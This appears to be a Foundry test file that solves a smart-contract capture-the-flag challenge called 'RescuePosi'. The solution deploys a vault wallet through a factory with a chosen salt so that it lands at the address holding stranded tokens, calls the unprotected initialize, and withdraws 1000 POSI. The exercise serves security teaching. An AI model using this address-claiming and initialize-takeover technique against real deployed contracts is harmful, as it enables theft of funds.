// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VaultFactory} from "../src/4_RescuePosi/myVaultFactory.sol";
import {VaultWalletTemplate} from "../src/4_RescuePosi/myVaultWalletTemplate.sol";
import {PosiCoin} from "../src/4_RescuePosi/PosiCoin.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge4Test is Test {
    VaultFactory public FACTORY;
    PosiCoin public POSI;
    address public unclaimedAddress = 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F;
    address public whitehat = makeAddr("whitehat");
    address public devs = makeAddr("devs");

    function setUp() public {
        vm.label(unclaimedAddress, "Unclaimed Address");

        // Instantiate the Factory
        FACTORY = new VaultFactory();

        // Instantiate the POSICoin
        POSI = new PosiCoin();

        // OOPS transferred to the wrong address!
        POSI.transfer(unclaimedAddress, 1000 ether);
    }

    function testWhitehatRescue() public {
        vm.deal(whitehat, 10 ether);
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge4Test -vvvv //
        ////////////////////////////////////////////////////*/

        bytes memory code = type(VaultWalletTemplate).creationCode;

        address payable vault = payable(FACTORY.deploy(code, 11));

        assertEq(vault, unclaimedAddress);

        VaultWalletTemplate wallet = VaultWalletTemplate(vault);
        wallet.initialize(whitehat);
        wallet.withdrawERC20(address(POSI), 1000 ether, devs);

        //==================================================//
        vm.stopPrank();

        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
    }
}
